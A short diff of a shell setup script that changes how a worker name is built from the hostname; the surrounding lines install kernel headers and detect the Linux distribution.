@@ -1,7 +1,7 @@
 cd /home
 myworker=$(date +'%d%m_%H%M%S_')
 username=$HOSTNAME
-shortname=${username:2:12}
+shortname=${username:0:12}
 myworker+=$shortname
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
